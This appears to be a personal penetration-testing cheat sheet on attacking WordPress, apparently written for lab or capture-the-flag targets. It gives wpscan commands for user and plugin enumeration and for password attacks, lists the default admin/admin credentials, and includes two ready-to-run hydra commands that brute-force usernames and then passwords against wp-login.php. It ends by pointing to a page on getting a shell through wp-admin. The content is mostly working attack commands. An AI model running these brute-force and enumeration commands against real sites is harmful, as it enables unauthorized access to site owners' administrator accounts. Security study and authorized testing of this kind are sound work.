# Wordpress

## References
- [Wordpress user enumeration, hackertarget](https://hackertarget.com/wordpress-user-enumeration/)

## Wpscan

[wpscan](https://wpscan.com/wordpress-security-scanner)

`gem install wpscan`

```
# Basic enumeration
wpscan --url URL -e

# Plugin enumeration
wpscan --url URL --enumerate ap

wpscan --password-attack wp-login -U [wl-username] -P [wl-passwords] --url [wp-url]
```

## wp-login
Login site for administrators.

Default credentials:
- Username *admin*
- Password *admin*

### Getting wp-admin access

**Manual username/password enumeration with hydra**

The site lets you know if the username exists, so to try a bunch:

```
hydra -L wl -p test vtcsec http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.10.29%2Fwordpress%2Fwp-admin%2F&testcookie=1:F=Invalid username."
```

And then to try passwords:
```
hydra -L wl -p test vtcsec http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.10.29%2Fwordpress%2Fwp-admin%2F&testcookie=1:F=<title>Log In"
```

Make sure the POST-string is correct, check your browser after a login attempt.

**See (wp-admin_shell)[wp-admin_shell] for more examples of how to get a shell through wp-admin.**
